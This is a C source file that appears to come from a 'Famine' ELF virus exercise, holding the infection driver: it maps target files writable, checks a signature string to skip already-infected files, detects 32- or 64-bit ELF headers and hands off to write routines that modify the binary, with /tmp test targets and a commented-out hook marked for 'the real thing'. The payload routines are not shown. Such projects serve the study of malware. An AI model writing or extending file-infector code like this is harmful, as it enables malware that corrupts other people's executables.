#include "famine.h"

int		error(char *str)
{
	dprintf(2, RED"%s"RESET, str);
	return (1);
}

int		check_copy(char *ptr, size_t size)
{
	for (int i = 0; i < size; ++i)
	{
		if (message[0] == ptr[i])
		{
			int j = 0;
			int ms = strlen(message);
			while (i < size && j < ms)
			{
				if (message[j] != ptr[i])
					break;
				++j;
				++i;
			}
			if (j == ms)
				return (1);
		}
	}
	return (0);
}

int		find32or64ELF(void *ptr)
{
	Elf32_Ehdr	*ehdr		= (Elf32_Ehdr *) ptr;

	if (ehdr->e_ident[EI_CLASS] == ELFCLASS32)
	{
		//fprintf(stdout, BOLDRED"<"CYAN"o"RED">"RESET YELLOW" 32bits\n"RESET);
		return (1);
	}
	if (ehdr->e_ident[EI_CLASS] == ELFCLASS64)
	{
		//fprintf(stdout, BOLDRED"<"CYAN"o"RED">"RESET YELLOW" 64bits\n"RESET);
		return (2);
	}
	return (0);
}

int		processing(char *ptr, size_t size, char *path, int fd)
{
	unsigned int	magic_number;
	unsigned int	elf_magic_number;
	
	message = "face a la patate, tout est possible #Famine (jucapik)";
	if (check_copy(ptr, size))
		return (error("File already infected - "));
	magic_number = *(int *)ptr;
	elf_magic_number = ELFMAG3 << 24 | ELFMAG2 << 16 | ELFMAG1 << 8 | ELFMAG0;
	if (magic_number ==  elf_magic_number)
	{
		if (find32or64ELF(ptr) == 1 && write_string32(ptr, size, path, fd))
			return (1);
		if (find32or64ELF(ptr) == 2 && write_string64(ptr, size, path, fd))
			return (1);
		return (0);
	}
	else
	{
		error("not recognized as a valid object\n");
		return (1);
	}
}

int		infect(char *path)
{
	int		fd;
	char		*ptr;
	struct stat	buf;

	if ((fd = open(path, O_RDWR)) < 0)
		return (error("open failed\n"));
	if (fstat(fd, &buf) < 0)
		return (error("fstat failed\n"));
	if (S_ISDIR(buf.st_mode))
	{
		dprintf(2, "%s is a directory\n", path);
		return (1);
	}
	if ((ptr = mmap(0, buf.st_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE, fd, 0))
		== MAP_FAILED)
		return (error("mmap failed\n"));
	if (processing(ptr, buf.st_size, path, fd))
	{
		dprintf(2, RED"%s infection failed\n"RESET, path);
		return (1);
	}
	if (munmap(ptr, buf.st_size) < 0)
		return (error("munmap failed\n"));
	if (close(fd) < 0)
		return (error("failed to close fd\n"));
	return (0);
}

int		main(int ac, char **av)
{
	//outputhandle(ac, av); //TODO: activate for the real thing
	if (ac <= 1)
	{
		infect("/tmp/test");
		infect("/tmp/test2");
	}
	else
	{
		for (int i = 1; i < ac; ++i)
		{
			if (av[i][0] != '-')
				infect(av[i]);
		}
	}
	return (0);
}
